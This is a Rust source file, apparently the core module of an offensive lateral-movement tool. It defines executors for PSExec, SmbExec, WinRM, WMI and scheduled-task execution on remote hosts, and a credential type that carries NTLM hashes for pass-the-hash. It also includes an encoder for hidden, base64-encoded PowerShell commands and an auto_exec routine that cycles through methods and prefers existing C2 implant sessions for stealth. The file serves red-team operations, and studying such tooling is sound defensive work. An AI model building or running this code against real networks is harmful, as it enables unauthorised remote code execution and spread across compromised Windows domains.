//! Remote command execution module.
//!
//! Provides multiple lateral movement execution methods:
//! - PSExec-style (SMB service creation)
//! - SmbExec (command-only, no binary drop)
//! - WinRM (WS-Management via native Win32 API or pure Rust)
//! - WMI (Win32_Process Create, with SCM fallback)
//! - AtExec (Scheduled Tasks via ATSVC)
//! - Plugin (via loaded plugin modules)
//! - C2 (via connected C2 framework sessions)
//!
//! Each method implements the `RemoteExecutor` trait for a unified interface.
//! All methods are cross-platform (Linux/macOS/Windows).

pub mod atexec;
pub mod psexec;
pub mod shell; // ← Export shell module
pub mod smbexec;
pub mod winrm;
pub mod wmiexec;

use crate::error::Result;
use async_trait::async_trait;
use serde::{Deserialize, Serialize};

/// Output from a remote command execution
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExecOutput {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: Option<i32>,
    pub method: ExecMethod,
}

/// Which execution method was used
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum ExecMethod {
    PsExec,
    SmbExec,
    WinRM,
    WmiExec,
    AtExec,
    /// Execution via a loaded plugin
    Plugin {
        plugin_id: String,
    },
    /// Execution via a C2 framework session
    C2 {
        framework: String,
        session_id: String,
    },
}

impl std::fmt::Display for ExecMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::PsExec => write!(f, "PSExec"),
            Self::SmbExec => write!(f, "SMBExec"),
            Self::WinRM => write!(f, "WinRM"),
            Self::WmiExec => write!(f, "WMIExec"),
            Self::AtExec => write!(f, "AtExec"),
            Self::Plugin { plugin_id } => write!(f, "Plugin({})", plugin_id),
            Self::C2 {
                framework,
                session_id,
            } => {
                write!(f, "C2({}/{})", framework, session_id)
            }
        }
    }
}

/// Credentials for remote execution
#[derive(Debug, Clone)]
pub struct ExecCredentials {
    pub domain: String,
    pub username: String,
    pub password: String,
    /// Optional: NTLM hash for pass-the-hash (hex string)
    pub nt_hash: Option<String>,
}

/// Unified trait for all remote execution methods
#[async_trait]
pub trait RemoteExecutor: Send + Sync {
    /// The execution method this executor uses
    fn method(&self) -> ExecMethod;

    /// Execute a single command on the remote target
    async fn execute(&self, target: &str, command: &str) -> Result<ExecOutput>;

    /// Execute a PowerShell command (base64-encoded for transport)
    async fn execute_powershell(&self, target: &str, script: &str) -> Result<ExecOutput> {
        let encoded = base64_encode_ps(script);
        let cmd = format!("powershell.exe -NoP -NonI -Enc {encoded}");
        self.execute(target, &cmd).await
    }

    /// Check if this execution method is available against the target
    async fn check_available(&self, _target: &str) -> bool;

    /// Clean up any artifacts left on the target
    async fn cleanup(&self, _target: &str) -> Result<()> {
        Ok(()) // default: no cleanup needed
    }
}

// ──────────────────────────────────────────────────────────
// C2-backed executor — wraps a C2 session as a RemoteExecutor
// ──────────────────────────────────────────────────────────

/// Wraps a C2 channel + session ID into a RemoteExecutor
/// This lets C2 sessions participate in `auto_exec` alongside
/// native execution methods.
pub struct C2Executor {
    pub framework_name: String,
    pub session_id: String,
    pub session_hostname: String,
    /// Shared reference to the C2 manager
    /// In practice this would be Arc<RwLock<C2Manager>> but for the trait
    /// we store the channel ref. The actual implementation calls through
    /// the C2Manager in commands_impl.rs.
    _marker: std::marker::PhantomData<()>,
}

impl C2Executor {
    pub fn new(framework_name: String, session_id: String, hostname: String) -> Self {
        Self {
            framework_name,
            session_id,
            session_hostname: hostname,
            _marker: std::marker::PhantomData,
        }
    }
}

#[async_trait]
impl RemoteExecutor for C2Executor {
    fn method(&self) -> ExecMethod {
        ExecMethod::C2 {
            framework: self.framework_name.clone(),
            session_id: self.session_id.clone(),
        }
    }

    async fn execute(&self, _target: &str, _command: &str) -> Result<ExecOutput> {
        // This is a stub — the real implementation must go through C2Manager
        // because the C2Channel trait requires &self on the manager.
        // In practice, commands_impl.rs calls c2_manager.exec_command() directly
        // and wraps the result into ExecOutput.
        Err(crate::error::OverthroneError::ExecSimple(format!(
            "C2Executor::execute called directly — use C2Manager.exec_command() instead \
             (session={}, framework={})",
            self.session_id, self.framework_name
        )))
    }

    async fn check_available(&self, target: &str) -> bool {
        // A C2 session is "available" if the target hostname matches
        self.session_hostname.eq_ignore_ascii_case(target)
    }
}

/// Base64-encode a PowerShell script for -EncodedCommand
fn base64_encode_ps(script: &str) -> String {
    use base64::Engine;
    // PowerShell expects UTF-16LE encoded base64
    let utf16: Vec<u8> = script
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    base64::engine::general_purpose::STANDARD.encode(&utf16)
}

/// Try all available execution methods in order of stealth
///
/// Order: C2 (if session exists) → WinRM → AtExec → SmbExec → PSExec → WMI
///
/// If `c2_sessions` is provided, C2 sessions matching the target hostname
/// are tried first (most OPSEC-safe since traffic goes through existing implant).
pub async fn auto_exec(target: &str, command: &str, creds: &ExecCredentials) -> Result<ExecOutput> {
    use tracing::info;

    // Order: WinRM → AtExec → SmbExec → PsExec → WMI (most reliable first)
    #[allow(unused_mut)]
    let mut executors: Vec<Box<dyn RemoteExecutor>> = vec![
        Box::new(winrm::WinRmExecutor::new(creds.clone())),
        Box::new(atexec::AtExecutor::new(creds.clone())),
        Box::new(smbexec::SmbExecutor::new(creds.clone())),
        Box::new(psexec::PsExecutor::new(creds.clone())),
    ];
    // WmiExec only works on Windows — skip on other platforms
    #[cfg(windows)]
    executors.push(Box::new(wmiexec::WmiExecutor::new(creds.clone())));

    for executor in &executors {
        if executor.check_available(target).await {
            info!("exec: Using {} for {target}", executor.method());
            return executor.execute(target, command).await;
        }
    }

    Err(crate::error::OverthroneError::ExecSimple(format!(
        "No execution method available for {target}"
    )))
}

/// Enhanced auto_exec that also considers C2 sessions
///
/// Tries C2 sessions first (best OPSEC), then falls back to native methods.
pub async fn auto_exec_with_c2(
    target: &str,
    command: &str,
    creds: &ExecCredentials,
    c2_executors: Vec<Box<dyn RemoteExecutor>>,
) -> Result<ExecOutput> {
    use tracing::info;

    // Try C2 sessions first (best OPSEC — reuses existing implant)
    for executor in &c2_executors {
        if executor.check_available(target).await {
            info!("exec: Using {} for {target} (via C2)", executor.method());
            return executor.execute(target, command).await;
        }
    }

    // Fall back to native methods
    info!("exec: No C2 session for {target}, falling back to native methods");
    auto_exec(target, command, creds).await
}

#[cfg(test)]
mod tests {
    use base64::Engine;

    use super::*;

    #[test]
    fn test_base64_encode_powershell() {
        let script = "Write-Host 'test'";
        let encoded = base64_encode_ps(script);

        // Should be base64 of UTF-16LE
        assert!(encoded.len() > script.len());
        assert!(
            base64::engine::general_purpose::STANDARD
                .decode(&encoded)
                .is_ok()
        );
    }

    #[test]
    fn test_exec_method_display() {
        assert_eq!(ExecMethod::PsExec.to_string(), "PSExec");
        assert_eq!(ExecMethod::WinRM.to_string(), "WinRM");
        assert_eq!(ExecMethod::WmiExec.to_string(), "WMIExec");
        assert_eq!(ExecMethod::SmbExec.to_string(), "SMBExec");
        assert_eq!(
            ExecMethod::Plugin {
                plugin_id: "test".to_string()
            }
            .to_string(),
            "Plugin(test)"
        );
        assert_eq!(
            ExecMethod::C2 {
                framework: "Sliver".to_string(),
                session_id: "abc123".to_string(),
            }
            .to_string(),
            "C2(Sliver/abc123)"
        );
    }

    #[test]
    fn test_c2_executor_check_available() {
        let executor = C2Executor::new(
            "Sliver".to_string(),
            "session-123".to_string(),
            "DC01".to_string(),
        );

        // check_available is async, but we can verify the struct
        assert_eq!(executor.framework_name, "Sliver");
        assert_eq!(executor.session_hostname, "DC01");
    }
}
